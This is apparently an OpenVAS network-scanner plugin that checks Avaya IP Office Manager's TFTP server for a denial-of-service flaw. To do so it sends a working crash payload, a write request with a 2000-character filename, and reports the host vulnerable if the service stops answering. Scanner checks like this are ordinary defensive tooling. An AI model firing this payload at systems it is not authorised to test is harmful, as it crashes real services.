if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802011" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)" );
	script_bugtraq_id( 47021 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "Avaya IP Office Manager TFTP Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/43819" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17045/" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow unauthenticated attackers to
  cause the application to crash." );
	script_tag( name: "affected", value: "Avaya Ip Office Manager 8.1, Other versions may also be
  affected." );
	script_tag( name: "insight", value: "The flaw is due to an error while handling certain crafted TFTP
  write requests, which can be exploited by remote unauthenticated attackers to crash an affected application." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Avaya IP Office Manager TFTP Server and is
  prone to denial of service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("tftp.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
res = tftp_get( port: port, path: "bin.cfg" );
if(isnull( res ) && !ContainsString( res, "avaya" )){
	exit( 0 );
}
soc = open_sock_udp( port );
if(!soc){
	exit( 0 );
}
crash = crap( data: "A", length: 2000 );
req = raw_string( 0x00, 0x02 ) + "A" + raw_string( 0x00 ) + crash + raw_string( 0x00 );
send( socket: soc, data: req );
info = recv( socket: soc, length: 1024 );
res = tftp_get( port: port, path: "bin.cfg" );
if(isnull( res ) && !ContainsString( res, "avaya" )){
	security_message( port: port, proto: "udp" );
	exit( 0 );
}
exit( 99 );

